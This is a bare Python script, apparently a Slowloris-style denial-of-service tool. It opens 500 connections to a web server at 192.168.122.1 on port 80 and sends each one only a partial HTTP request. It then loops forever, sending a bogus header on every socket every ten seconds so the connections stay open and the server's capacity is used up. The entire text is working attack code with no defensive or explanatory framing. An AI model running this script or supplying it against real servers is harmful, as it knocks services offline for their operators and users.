import socket
import time

host = "192.168.122.1"
port = 80
n = 500
t = 10
sockets = []

for i in range(n):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    request = b"GET / HTTP/1.1\r\n"
    s.send(request)
    sockets.append(s)

while True:
    for i in range(len(sockets)):
        s = sockets[i]
        s.send(b"Bogus-header: Nonsense\r\n")
    print("Sleeping {} seconds..".format(t))
    print(len(sockets))
    time.sleep(t)